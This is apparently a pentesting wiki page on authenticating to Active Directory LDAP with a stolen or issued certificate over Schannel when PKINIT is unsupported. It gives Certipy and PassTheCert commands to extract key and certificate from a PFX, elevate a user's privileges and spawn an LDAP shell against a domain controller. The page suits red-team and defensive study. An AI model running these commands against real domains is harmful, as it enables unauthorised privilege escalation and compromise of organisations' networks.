## Theory
Sometimes, Domain Controllers do not support PKINIT. This can be because their certificates do not have the Smart Card Logon EKU. Most of the time, domain controllers return `KDC_ERR_PADATA_TYPE_NOSUPP` error when the EKU is missing. Fortunately, several protocols — including LDAP — support Schannel, thus authentication through TLS. As the term "schannel authentication" is derived from the Schannel SSP (Security Service Provider) which is the Microsoft SSL/TLS implementation in Windows, it is important to note that schannel authentication is a SSL/TLS client authentication.

## Exploit 
=== "UNIX-like"
    Tools like [PassTheCert](https://github.com/AlmondOffSec/PassTheCert/) (python version) and [Certipy](https://github.com/ly4k/Certipy) can be used to authenticate with the certificate via Schannel against LDAP.
    ```bash
    # If you use Certipy to retrieve certificates, you can extract key and cert from the pfx by using:
    certipy cert -pfx user.pfx -nokey -out user.crt
    certipy cert -pfx user.pfx -nocert -out user.key

    # elevate a user (it assumes that the domain account for which the certificate was issued, holds privileges to elevate user)
    passthecert.py -action modify_user -crt user.crt -key user.key -domain domain.local -dc-ip "10.0.0.1" -target user_sam -elevate

    # spawn a LDAP shell
    passthecert.py -action ldap-shell -crt user.crt -key user.key -domain domain.local -dc-ip "10.0.0.1"
    certipy auth -pfx -dc-ip "10.0.0.1" -ldap-shell